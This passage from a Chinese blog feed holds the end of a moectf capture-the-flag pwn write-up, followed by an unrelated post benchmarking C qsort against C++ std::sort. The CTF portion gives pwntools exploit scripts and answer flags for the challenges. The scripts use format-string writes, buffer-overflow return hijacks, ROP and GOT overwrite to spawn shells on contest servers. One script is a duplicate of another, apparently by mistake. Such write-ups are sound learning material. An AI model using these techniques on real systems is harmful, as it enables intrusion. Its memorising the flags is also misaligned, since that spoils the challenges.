&amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">0x80000000</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;0 ?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;But I want &lt;0 now!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You know int overflow!&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&gt;0 ?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按看到的那样, 随便给一个无符号整数2147483648(0x80000000)即可. <span style="color: #CCC;">用过修改器的同学应该对这个数字很熟悉hhh</span></p><blockquote><p>moectf{y0ul0v3m3m3l0v3y0u_1nt0v3rfl0w}</p></blockquote><h3 id="baby-fmt"><a href="#baby-fmt" class="headerlink" title="baby_fmt"></a>baby_fmt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序先产生一个随机数, 保存在dword_804C044全局变量里. 然后看到<code>printf</code>那里有一个经典漏洞, 盘它!</p><p>程序执行到那一行时的栈如图所示:</p><table style="width: fit-content;">    <tr><td>0x1C</td><td>0x70 buf</td></tr>    <tr><td>0x4</td><td>0x18 space</td></tr>    <tr><td>0x0</td><td>buf ptr</td></tr></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./babyfmt&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9503</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%12$n\0\0\0&#x27;</span> + p32(<span class="number">0x804C044</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{fmt_1s_soooo_e@sy}</p></blockquote><h3 id="ret2text-ez"><a href="#ret2text-ez" class="headerlink" title="ret2text_ez"></a>ret2text_ez</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./babyfmt&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9503</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%12$n\0\0\0&#x27;</span> + p32(<span class="number">0x804C044</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{1_l0v3_pwn!!!I’ll_ak_pwn}</p></blockquote><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9502</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;*&#x27;</span>*(<span class="number">10</span>+<span class="number">8</span>)+p64(<span class="number">0x40068B</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{ret2txt_tr4v3l2she11}</p></blockquote><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9504</span>)</span><br><span class="line">addr_text = <span class="number">0x804A028</span></span><br><span class="line">addr_gets = <span class="number">0x8048380</span></span><br><span class="line">addr_system = <span class="number">0x8048513</span></span><br><span class="line">v = <span class="string">b&#x27;*&#x27;</span>*(<span class="number">0x24</span>+<span class="number">4</span>*<span class="number">2</span>)+p32(addr_gets)+p32(addr_system)+p32(addr_text)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">p.sendline(v)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{do_you_l1k3_vtuber_too?}</p></blockquote><h3 id="Int-overflow-revenge"><a href="#Int-overflow-revenge" class="headerlink" title="Int_overflow_revenge"></a>Int_overflow_revenge</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./intoverflow&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9508</span>)</span><br><span class="line">addr_shl = <span class="number">0x8049246</span></span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">b&#x27;131&#x27;</span>)</span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(addr_shl), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{the_watermelon_is_permitted_to_be_grown_up}</p></blockquote><h3 id="Human’s-Nature"><a href="#Human’s-Nature" class="headerlink" title="Human’s Nature"></a>Human’s Nature</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">p, addr</span>):</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;%9$s\0\0\0\0&#x27;</span> + p64(addr + <span class="number">7</span> - i))</span><br><span class="line">tt = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(tt) &gt; <span class="number">1</span>:</span><br><span class="line">n = (n &lt;&lt; <span class="number">8</span>) | tt[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n = n &lt;&lt; <span class="number">8</span></span><br><span class="line"><span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./hijack&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>, <span class="number">9505</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvuntil(<span class="string">b&quot;???\nWhat&#x27;s human&#x27;s nature???\n&quot;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;%23$p&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">reloc = <span class="built_in">eval</span>(p.recvline()) - <span class="number">0x555A28555303</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;* Get reloc &#x27;</span> + <span class="built_in">hex</span>(reloc))</span><br><span class="line">p_printf = reloc + <span class="number">0x555A28558020</span></span><br><span class="line">p.recvline()</span><br><span class="line">f_printf = get_data(p, p_printf)</span><br><span class="line">of_system = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">of_system = <span class="number">0x48E50</span> - <span class="number">0x56CF0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">of_system = <span class="number">0x4F550</span> - <span class="number">0x64F70</span></span><br><span class="line">f_system = f_printf + of_system</span><br><span class="line">wr = fmtstr_payload(<span class="number">8</span>, &#123;p_printf:f_system&#125;)</span><br><span class="line">p.sendline(wr)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{hIj4ck_Is_@_gr34t_w4y_t0_g3t_sh311}</p></blockquote><h1 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h1><p>持续更新中…</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C中的qsort真的比C++中的std::sort快吗?</title>
      <link href="/2021/09/20/test-sort/"/>
      <url>/2021/09/20/test-sort/</url>
      
        <content type="html"><![CDATA[<div class="note warning simple"><p><strong>注意</strong><br>本文仅代表个人浅显观点. 个人水平有限, 在测试时可能会以偏概全, 但我会尽力避免这种问题的. 文中如果有错误, 也欢迎指正.</p></div><p>之前主要学的C, 因为那个时候听说C比C++快. 现在我写代码几乎都是C风格的. <span class="p gray">(但不完全是, 虽然说没有用C++的太多特性, 但我的代码经过纯C编译时还是会出错, 因为有时变量没有在开头申明, 结构体在使用时也没有在前面加<code>struct</code>)</span> 最近打acm了解了点C++和STL, 在看其他人代码的时候发现大多数人用的C++风格代码. 他们排序时用的是<code>sort</code>函数. 然后我就想测试一下<code>qsort</code>和<code>std::sort</code>哪个快. 翻文章和做逆向时学到了很多东西, 在此记录一下.</p><h1 id="效率测试"><a href="#效率测试" class="headerlink" title="效率测试"></a>效率测试</h1><p>直接放测试代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pause</span><span class="params">(<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    DWORD pid;</span><br><span class="line">    HWND hWnd = <span class="built_in">GetConsoleWindow</span>();</span><br><span class="line">    <span class="built_in">GetWindowThreadProcessId</span>(hWnd, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="built_in">GetCurrentProcessId</span>())&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">getchar</span>() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONGLONG frequency = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONGLONG <span class="title">counter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LARGE_INTEGER l;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">QueryPerformanceCounter</span>(&amp;l)) <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">return</span> l.QuadPart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p1, <span class="keyword">const</span> <span class="keyword">void</span> *p2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">int</span>*)p1 - *(<span class="keyword">int</span>*)p2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LARGE_INTEGER l;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">QueryPerformanceFrequency</span>(&amp;l))&#123;</span><br><span class="line">        frequency = l.QuadPart;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Counter frequency: %lld\n&quot;</span>, frequency);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x1234</span>);</span><br><span class="line">    <span class="keyword">int</span> N = <span class="number">0x400000</span>;</span><br><span class="line">    <span class="keyword">int</span> *s = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) s[i] = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="comment">//for (int i = 0; i &lt; N; i++) s[i] = i;</span></span><br><span class="line">    <span class="comment">//for (int i = 0; i &lt; N; i++) s[i] = N - i;</span></span><br><span class="line">    LONGLONG c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *t = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">    <span class="built_in">memcpy</span>(t, s, N * <span class="built_in"><span class="keyword">sizeof</span></span> (<span class="keyword">int</span>));</span><br><span class="line">    c = <span class="built_in">counter</span>();</span><br><span class="line">    <span class="built_in">qsort</span>(t, N, <span class="built_in"><span class="keyword">sizeof</span></span> (<span class="keyword">int</span>), &amp;cmp);</span><br><span class="line">    c = <span class="built_in">counter</span>() - c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;qsort     %lld\n&quot;</span>, c);</span><br><span class="line">    <span class="keyword">delete</span> t;</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">    v.<span class="built_in">resize</span>(N);</span><br><span class="line">    <span class="built_in">memcpy</span>(v.<span class="built_in">data</span>(), s, N * <span class="built_in"><span class="keyword">sizeof</span></span> (<span class="keyword">int</span>));</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt;::iterator _l = v.<span class="built_in">begin</span>(), _r = v.<span class="built_in">end</span>();</span><br><span class="line">    c = <span class="built_in">counter</span>();</span><br><span class="line">    <span class="built_in">sort</span>(_l, _r);</span><br><span class="line">    c = <span class="built_in">counter</span>() - c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;std::sort %lld\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> s;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pause</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单解释一下吧. 代码用了Windows平台的一些特性. <code>pause</code>函数不用也行, 主要是在调试时你总不希望程序双击运行的时候窗口一闪而过吧. 这个函数会判断当前窗口是否是自身进程(在命令行下运行窗口就不是自身进程, 是宿主cmd的), 如果是就暂停. <code>counter</code>是一个高精度的计时器(硬件层计数器), 比<code>GetTickCount</code>精确. 两次计数的差值就是计数时代码的运行时间, 单位是tick每秒. tick保存在<code>frequency</code>变量里, 在我的电脑上它的值为10000000(所以说比较精确). 然后后面的就是测试程序了, 相信这个应该好看懂.</p><p>在我电脑上测试结果如下(<code>N=0x400000</code>):</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据</th><th style="text-align:right"><code>qsort</code>用时</th><th style="text-align:right"><code>std::sort</code>用时</th><th style="text-align:right">不优化的<code>std::sort</code>用时</th></tr></thead><tbody><tr><td style="text-align:center">乱序</td><td style="text-align:right">3,312,103</td><td style="text-align:right">2,162,993</td><td style="text-align:right">10,723,971</td></tr><tr><td style="text-align:center">正序</td><td style="text-align:right">1,698,487</td><td style="text-align:right">636,871</td><td style="text-align:right">6,639,209</td></tr><tr><td style="text-align:center">逆序</td><td style="text-align:right">1,755,068</td><td style="text-align:right">499,027</td><td style="text-align:right">5,116,859</td></tr></tbody></table></div><p>编译参数:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="string">&quot;%~1&quot;</span> -o <span class="string">&quot;%~n1.exe&quot;</span> -O2 -g -lstdc++ %O2优化%</span><br><span class="line">gcc <span class="string">&quot;%~1&quot;</span> -o <span class="string">&quot;%~n1d.exe&quot;</span> -O0 -g -lstdc++ %无优化%</span><br></pre></td></tr></table></figure><blockquote><p>在acm比赛时, 一般开O2优化</p></blockquote><p>由于<code>qsort</code>只是库中的一个函数, 所以开不开优化对时间影响不大; 而<code>std::sort</code>是模板库, 会参与编译过程, 于是把两种情况都列了出来. 上面的结果吓我一跳, 之前听说C++输入输出流如果处理好会比C的输入输出快, 没想到C++的<code>std::sort</code>处理好效率也会很高. 于是我打开IDA, <psw>胡乱地</psw>分析一波.</p><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><h2 id="O2优化改变了什么"><a href="#O2优化改变了什么" class="headerlink" title="O2优化改变了什么"></a>O2优化改变了什么</h2><p>IDA打开后, 直接F5大法好, 得到下图:<br><div class="justified-gallery"><p><img src="/pictures/test_sort_optimize_0.jpg" alt="不优化"><br><img src="/pictures/test_sort_optimize_2.jpg" alt="优化"></p>          </div></p><p>其中代码少的那个是不优化的.<br><mark class="hl-label pink">什么嘛, 明明不优化更简单一些, 怎么就慢了这么多?</mark> <br>这就是产生效率问题的华点, 解释下代码先.</p><ul><li>左图中的<code>counter</code>函数被内联了, 简单来说就是把函数内部的代码直接”拿来”, 嵌到调用函数的地方, 这样可以减少堆栈的使用, 进而提升效率. 所以左图中第34行, 对应右图的45-46行. 下面出现的<code>counter</code>同理.</li><li>左图39-43行, 是初始化<code>vector</code>和从<code>s</code>搬移数组的代码, 对应右边54-57行. 也是发生了一定的内联.</li><li>47行调用了<code>std::sort</code>进行排序, 对应右边61-94行</li></ul><p>右图看起来代码很多就是因为排序函数的内联展开, 但是, 这真的说明右边的代码多吗?<br>我们从左图的排序函数点进去, 图太多懒得截了, 总之里面调用了很多其他函数, 而且其他函数又调用了很多函数, 但这些有很多是重载运算符的函数, 它们实际上只是简单地返回一个值. 也就是说如果可以把它们内联, 代码量是可以大量减少的. 实际上, 开O2优化让代码的体积减少了50K. 虽然说调试符号占了大多数体积, 不输出调试符号只能减少大概10K. 但是如果你的代码用了更多STL的内容, 优化的效果就很显著了.<br>扯远了~~ 反正逆向后我找到的区别就这么些. 我修改了代码, 统计排序比较的次数, 结果在乱序的情况下, 二者的比较次数都是96906511次, 就是说优化并没有改变算法过程, 它只是内联了部分函数而已. 下面我们来看看不开优化的函数调用关系:</p><p><img src="/pictures/sort_stack.svg" alt="函数调用图"></p><p>别看不优化也只调用这么几个函数, 其实是我把一些不重要的忽略了. 而且像这些末端函数内部也是有大量优化操作的, 这个图只是展示了<code>main</code>函数中我们看到的<code>std::sort</code>优化与否的区别. 不优化的时候, 我们从<code>main</code>函数上只看到了第一层, 即<code>std::sort</code>. 开O2优化时, 我们看到了第四层, 直接看到了图中的三个叶子结点, 它们对应61行, 66行和70-94行. 如果我们从优化后的<code>std::__introsort_loop</code>点进去, 会发现又是巨量的优化. 所以, 这个优化极大地减少了函数调用次数.</p><h2 id="关于函数调用"><a href="#关于函数调用" class="headerlink" title="关于函数调用"></a>关于函数调用</h2><p>为什么函数调用对效率的影响这么大呢?<br>函数调用的过程:</p><ul><li>准备好所有参数, 将它们置入栈或者寄存器, 